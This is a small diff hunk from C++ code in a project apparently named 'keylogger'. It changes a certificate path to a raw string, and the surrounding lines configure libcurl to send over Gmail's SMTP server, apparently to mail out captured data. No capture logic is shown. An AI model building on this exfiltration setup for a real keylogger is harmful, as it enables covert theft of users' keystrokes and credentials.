@@ -61,7 +61,7 @@ int main()
 
 	if (curl)
 	{
-		static const char* pCACertFile = "C:\\repos\\keylogger\\curl-ca-bundle.crt";
+		static const char* pCACertFile = R"(C:\repos\keylogger\curl-ca-bundle.crt)";
 		curl_easy_setopt(curl, CURLOPT_CAINFO, pCACertFile);
 
 		curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
